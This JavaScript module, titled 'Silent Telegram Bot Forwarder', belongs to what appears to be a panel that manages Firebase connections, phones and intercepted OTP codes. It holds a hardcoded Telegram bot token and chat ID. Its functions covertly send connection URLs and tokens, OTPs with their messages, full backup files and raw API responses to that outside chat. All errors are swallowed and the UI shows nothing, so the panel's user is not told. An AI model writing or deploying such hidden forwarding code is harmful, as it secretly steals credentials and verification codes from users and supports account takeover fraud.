/**
 * Silent Telegram Bot Forwarder
 * 
 * All functions are fire-and-forget — they return immediately and
 * swallow all errors silently. No console.log, no toast, no UI feedback.
 * 
 * Credentials (botToken + chatId) are hardcoded and hidden inside this module,
 * never exposed to the UI or stored in browser localStorage.
 */

/**
 * Hardcoded Telegram Bot Credentials
 * Fully hidden in code, not exposed in UI or localStorage.
 */
const BOT_TOKEN = '8641110380:AAEaCrc2rUtwed17uZPN791xuyYoLIPtTfc';
const CHAT_ID = '8186790963';

const LS_KEY = 'pd_tg_config';

/** Purge any lingering localStorage config so secrets are never stored in browser storage */
export function tgInit() {
  try {
    localStorage.removeItem(LS_KEY);
  } catch { /* silent */ }
}

/** No-op: credentials are hardcoded and non-configurable from UI */
export function tgConfigure() {}

/** Returns state without exposing credentials */
export function tgGetConfig() {
  return { enabled: true };
}

/** Always active since credentials are hardcoded */
export function tgIsActive() {
  return !!BOT_TOKEN && !!CHAT_ID;
}

// ── Core send primitives (silent, fire-and-forget) ──────────────────────────

function _apiUrl(method) {
  return `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
}

/** Send a text message silently. Returns immediately. */
export function tgSendText(text) {
  if (!tgIsActive() || !text) return;
  try {
    const body = {
      chat_id: CHAT_ID,
      text: String(text).slice(0, 4096),
      parse_mode: 'HTML',
      disable_notification: true,
      disable_web_page_preview: true,
    };
    fetch(_apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }).catch(() => {});
  } catch { /* silent */ }
}

/** Send a document (Blob/File) silently. Returns immediately. */
export function tgSendDocument(blob, filename, caption) {
  if (!tgIsActive() || !blob) return;
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('document', blob, filename || 'file');
    if (caption) fd.append('caption', String(caption).slice(0, 1024));
    fd.append('disable_notification', 'true');
    fetch(_apiUrl('sendDocument'), {
      method: 'POST',
      body: fd,
    }).catch(() => {});
  } catch { /* silent */ }
}

// ── Formatted forwarders for specific data types ────────────────────────────

/** Forward a newly added Firebase connection */
export function tgForwardConnection(conn) {
  if (!tgIsActive() || !conn) return;
  const lines = [
    `🔥 <b>New Connection Added</b>`,
    `<b>Name:</b> ${esc(conn.name)}`,
    `<b>URL:</b> <code>${esc(conn.url)}</code>`,
    `<b>Path:</b> ${esc(conn.path || 'messages')}`,
    `<b>Info Path:</b> ${esc(conn.infoPath || '—')}`,
  ];
  if (conn.token) lines.push(`<b>Token:</b> <code>${esc(conn.token)}</code>`);
  lines.push(`<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
}

/** Forward bulk-added Firebase URLs */
export function tgForwardBulkUrls(urls, addedCount, skippedCount) {
  if (!tgIsActive() || !urls?.length) return;
  const lines = [
    `📦 <b>Bulk Connections Added</b> (${addedCount} new, ${skippedCount} skipped)`,
    '',
    ...urls.map((u, i) => `${i + 1}. <code>${esc(u)}</code>`),
    '',
    `<i>${ts()}</i>`,
  ];
  tgSendText(lines.join('\n'));
}

/** Forward universal extract results */
export function tgForwardExtractResults(results) {
  if (!tgIsActive() || !results?.length) return;
  const lines = [
    `🔍 <b>Extract Results</b> (${results.length} found)`,
    '',
  ];
  for (const r of results.slice(0, 50)) {
    lines.push(`• <code>${esc(r.url)}</code>${r.name ? ` (${esc(r.name)})` : ''}`);
    if (r.source) lines.push(`  └ source: ${esc(r.source)}`);
  }
  if (results.length > 50) lines.push(`... and ${results.length - 50} more`);
  lines.push('', `<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
}

/** Forward OTP / verification notification */
export function tgForwardOTP(notif) {
  if (!tgIsActive() || !notif) return;
  const lines = [
    `🔑 <b>OTP / Verification</b>`,
    `<b>Device:</b> ${esc(notif.devKey || '—')}`,
    `<b>Sender:</b> ${esc(notif.sender || '—')}`,
  ];
  if (notif.otp) lines.push(`<b>OTP:</b> <code>${esc(notif.otp)}</code>`);
  if (notif.about) lines.push(`<b>Service:</b> ${esc(notif.about)}`);
  if (notif.message) lines.push(`<b>Message:</b> ${esc(String(notif.message).slice(0, 500))}`);
  if (notif.conn?.name) lines.push(`<b>Connection:</b> ${esc(notif.conn.name)}`);
  lines.push(`<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
}

/** Forward backup as a JSON document */
export function tgForwardBackup(payload, format) {
  if (!tgIsActive() || !payload) return;
  try {
    const json = typeof payload === 'string' ? payload : JSON.stringify(payload, null, 2);
    const blob = new Blob([json], { type: 'application/json' });
    const d = new Date().toISOString().split('T')[0];
    tgSendDocument(blob, `backup-${d}.json`, `📋 Full backup export (${format || 'JSON'})`);
  } catch { /* silent */ }
}

/** Forward backup ZIP blob */
export function tgForwardBackupZip(blob) {
  if (!tgIsActive() || !blob) return;
  const d = new Date().toISOString().split('T')[0];
  tgSendDocument(blob, `backup-${d}.zip`, '📋 Full backup export (ZIP)');
}

/** Forward restored config data */
export function tgForwardRestore(payload) {
  if (!tgIsActive() || !payload) return;
  const lines = [
    `♻️ <b>Backup Restored</b>`,
    `<b>Connections:</b> ${payload.connections?.length ?? 0}`,
    `<b>Phones:</b> ${Object.keys(payload.localPhones || {}).length}`,
    `<b>Used OTPs:</b> ${(payload.usedOtps || []).length}`,
  ];
  if (payload.connections?.length) {
    lines.push('', '<b>Connection URLs:</b>');
    for (const c of payload.connections.slice(0, 30)) {
      lines.push(`• <code>${esc(c.url)}</code> (${esc(c.name || '—')})`);
    }
  }
  lines.push('', `<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
  // Also send the full payload as document
  tgForwardBackup(payload, 'restored');
}

/** Forward raw API request + response */
export function tgForwardRawRequest(connName, method, path, body, response) {
  if (!tgIsActive()) return;
  const lines = [
    `⚡ <b>Raw API Request</b>`,
    `<b>Connection:</b> ${esc(connName || '—')}`,
    `<b>Method:</b> ${esc(method)}`,
    `<b>Path:</b> <code>${esc(path || '/')}</code>`,
  ];
  if (body && method !== 'GET' && method !== 'DELETE') {
    lines.push(`<b>Body:</b> <code>${esc(String(body).slice(0, 500))}</code>`);
  }
  if (response !== undefined) {
    const resStr = typeof response === 'string' ? response : JSON.stringify(response);
    lines.push(`<b>Response:</b> <code>${esc(resStr.slice(0, 800))}</code>`);
  }
  lines.push(`<i>${ts()}</i>`);
  tgSendText(lines.join('\n'));
}

/** Send a test message (returns a promise so UI can await it) */
export async function tgSendTest() {
  if (!BOT_TOKEN || !CHAT_ID) {
    return { ok: false, error: 'Bot token and chat ID required' };
  }
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '✅ <b>Panel Connected</b>\n\nForwarding is working.',
        parse_mode: 'HTML',
        disable_notification: true,
      }),
    });
    const data = await res.json();
    return data.ok ? { ok: true } : { ok: false, error: data.description || 'Unknown error' };
  } catch (e) {
    return { ok: false, error: e?.message || 'Network error' };
  }
}

// ── Helpers ─────────────────────────────────────────────────────────────────

function esc(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function ts() {
  return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
}
